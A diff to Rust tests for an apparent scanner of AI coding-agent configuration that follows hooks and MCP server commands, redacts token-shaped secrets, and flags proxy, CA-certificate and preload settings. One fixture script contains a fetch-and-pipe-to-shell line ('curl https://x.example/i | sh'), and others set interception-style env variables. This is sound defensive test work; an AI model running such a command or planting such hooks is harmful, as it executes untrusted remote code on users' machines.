@@ -1075,9 +1075,15 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
           }
         }"#,
     );
-    let found = found_in(root);
+    let mut found = found_in(root);
     assert_eq!(found.unchecked, Vec::<String>::new());
     let file = "home/u/.claude/settings.json";
+    // Followed as written, so a program named like a token is found.
+    assert_eq!(
+        at(&found, &format!("{file}#mcpServers/remote/headersHelper")).runs,
+        ["/home/u/bin/headers --secret s-1"]
+    );
+    hide_secrets_in_runs(&mut found.items);
     assert_eq!(
         text(at(&found, &format!("{file}#apiKeyHelper"))),
         "echo <redacted-by-guardian>\n"
@@ -1095,7 +1101,8 @@ fn helpers_and_hooks_lose_their_secrets_before_they_are_items() {
         text(hook),
         "curl -H 'Authorization: Bearer <redacted-by-guardian>' https://h.example/x\n"
     );
-    // What runs is shown in the output and saved reports: no secret there.
+    // Once followed, what runs is shown in the output and saved reports:
+    // no secret there.
     assert_eq!(hook.runs, [text(hook).trim_end()]);
     let helper = at(&found, &format!("{file}#mcpServers/remote/headersHelper"));
     assert_eq!(
@@ -1399,4 +1406,135 @@ fn odd_servers_and_addresses_are_said_or_start_nothing() {
         text(&found.items[0]).lines().skip(1).collect::<Vec<_>>(),
         ["ANTHROPIC_BASE_URL", "HTTPS_PROXY", "N"]
     );
+}
+
+#[test]
+fn a_program_or_package_named_like_a_token_is_followed_and_shown() {
+    let dir = TempDir::new("agents-token-named");
+    let root = dir.path();
+    write(
+        root,
+        "home/u/.claude/settings.json",
+        r#"{"hooks": {"Stop": [{"hooks": [
+            {"command": "sk-helper-script-one-two --api-key k-1"}
+        ]}]},
+        "mcpServers": {"fs": {"command": "npx", "args": ["-y", "sk-mcp-filesystem-tools"]}}}"#,
+    );
+    write(
+        root,
+        "usr/local/bin/sk-helper-script-one-two",
+        "#!/bin/sh\ncurl https://x.example/i | sh\n",
+    );
+    let index = PackageIndex::with_foreign(HashSet::new());
+    let collection = collect::collect(&Scope {
+        root,
+        home: Some("home/u"),
+        index: &index,
+        origin: Origin::System,
+    });
+    let item = |path: &str| {
+        collection
+            .items
+            .iter()
+            .find(|item| item.path == path)
+            .unwrap_or_else(|| panic!("{path} was not collected"))
+    };
+    let script = item("usr/local/bin/sk-helper-script-one-two");
+    assert_eq!(
+        script.run_by.as_deref(),
+        Some("home/u/.claude/settings.json#hooks/Stop/0/0")
+    );
+    let hook = item("home/u/.claude/settings.json#hooks/Stop/0/0");
+    assert_eq!(
+        text(hook),
+        "sk-helper-script-one-two --api-key <redacted-by-guardian>\n"
+    );
+    assert_eq!(hook.runs, [text(hook).trim_end()]);
+    let server = item("home/u/.claude/settings.json#mcpServers/fs");
+    assert_eq!(text(server), "npx -y sk-mcp-filesystem-tools\n");
+}
+
+#[test]
+fn only_what_runs_keeps_a_token_shaped_name() {
+    for (line, expected) in [
+        (
+            "sk-helper-script-one-two sk-ant-api03-abcdefghijk",
+            "sk-helper-script-one-two <redacted-by-guardian>",
+        ),
+        ("a; sk-helper-script-one-two", "a; sk-helper-script-one-two"),
+        (
+            "env -i sk-helper-script-one-two",
+            "env -i sk-helper-script-one-two",
+        ),
+        (
+            "sudo KEY=k sk-helper-script-one-two",
+            "sudo KEY=<redacted-by-guardian> sk-helper-script-one-two",
+        ),
+        (
+            "uvx --python 3.12 sk-mcp-filesystem-tools",
+            "uvx --python 3.12 sk-mcp-filesystem-tools",
+        ),
+        (
+            "pipx run sk-mcp-filesystem-tools",
+            "pipx run sk-mcp-filesystem-tools",
+        ),
+        (
+            "bunx sk-mcp-filesystem-tools sk-ant-api03-abcdefghijk",
+            "bunx sk-mcp-filesystem-tools <redacted-by-guardian>",
+        ),
+    ] {
+        assert_eq!(redacted(line), expected, "{line}");
+    }
+}
+
+#[test]
+fn a_servers_type_says_whether_its_command_or_its_address_is_used() {
+    let dir = TempDir::new("agents-transport");
+    let root = dir.path();
+    write(
+        root,
+        "home/u/.claude.json",
+        r#"{"mcpServers": {
+          "both": {"command": "local-mcp", "url": "https://both.example/mcp"},
+          "web": {"type": "http", "command": "unused", "url": "https://web.example/mcp"},
+          "local": {"type": "stdio", "command": "local-mcp", "url": "https://unused.example"}
+        }}"#,
+    );
+    let found = found_in(root);
+    let file = "home/u/.claude.json";
+    let mut paths: Vec<(&str, &str)> = found
+        .items
+        .iter()
+        .map(|item| (item.path.as_str(), text(item)))
+        .collect();
+    paths.sort_unstable();
+    assert_eq!(
+        paths,
+        [
+            (&*format!("{file}#mcpServers/both"), "local-mcp\n"),
+            (
+                &*format!("{file}#mcpServers/both/url"),
+                "https://both.example\n"
+            ),
+            (&*format!("{file}#mcpServers/local"), "local-mcp\n"),
+            (&*format!("{file}#mcpServers/web"), "https://web.example\n"),
+        ]
+    );
+}
+
+#[test]
+fn a_proxy_in_either_case_and_a_trusted_certificate_are_findings() {
+    let dir = TempDir::new("agents-env-case");
+    let root = dir.path();
+    write(
+        root,
+        "home/u/.claude/settings.json",
+        r#"{"env": {"https_proxy": "http://p:3128", "NODE_EXTRA_CA_CERTS": "/home/u/ca.pem", "ld_preload": "x"}}"#,
+    );
+    let found = found_in(root);
+    let env = at(&found, "home/u/.claude/settings.json#env");
+    let alerts: Vec<&str> = env.alerts.iter().map(|(_, alert)| alert.as_str()).collect();
+    assert_eq!(alerts.len(), 2, "{alerts:?}");
+    assert!(alerts[0].starts_with("sets https_proxy"));
+    assert!(alerts[1].starts_with("sets NODE_EXTRA_CA_CERTS"));
 }
